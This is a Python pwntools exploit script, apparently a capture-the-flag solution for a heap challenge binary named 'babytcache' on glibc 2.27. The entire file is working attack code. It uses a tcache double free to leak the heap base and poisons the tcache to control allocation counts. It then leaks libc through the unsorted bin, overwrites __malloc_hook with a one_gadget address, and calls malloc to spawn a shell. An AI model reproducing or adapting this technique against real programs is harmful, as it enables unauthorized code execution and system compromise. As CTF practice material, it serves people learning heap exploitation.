#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./babytcache")
p = process("./babytcache")
gdb.attach(p,"init-pwndbg")
libc = ELF("libc-2.27.so")
def malloc(index,size,data):
    p.sendlineafter(">> ","1")
    p.recvline()
    p.sendline(str(index))
    p.recvline()
    p.sendline(str(size))
    p.recvline()
    p.send(data)

def edit(index,data):
    p.sendlineafter(">> ","2")
    p.recvline()
    p.sendline(str(index))
    p.recvline()
    p.send(data)

def free(index):
    p.sendlineafter(">> ","3")
    p.recvline()
    p.sendline(str(index))

def view(index):
    p.sendlineafter(">> ","4")
    p.recvline()
    p.sendline(str(index))
    p.recvuntil("Your Note :")
    leak = p.recvline()[:-1]
    return leak

def getShell(index,size):
    p.sendlineafter(">> ","1")
    p.recvline()
    p.sendline(str(index))
    p.recvline()
    p.sendline(str(size))

malloc(0,136,'a'*16)
malloc(1,136,'a'*16)
malloc(2,136,'a'*16)

free(0)
free(0)
heapleak = view(0)
heapleak = heapleak.ljust(8,b'\x00')
heapleak = u64(heapleak)
heap_base = heapleak - 0x260
log.critical("Heap base address: {}".format(hex(heap_base)))
malloc(3,136,p64(heap_base+0x10))
malloc(4,136,p64(heap_base+0x10))
malloc(5,136,b"\x00"*7+p8(7))
free(1)
leak = view(1)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak -0x3aeca0
log.critical("Libc base address: {}".format(hex(libc.address)))
__malloc_hook = libc.sym.__malloc_hook
edit(5,p8(0x1)+p8(0x0)*7+p64(0x0)*7+p64(__malloc_hook))
one_gadget = libc.address + 0xdfa31
malloc(6,24,p64(one_gadget))
getShell(7,2)
p.interactive()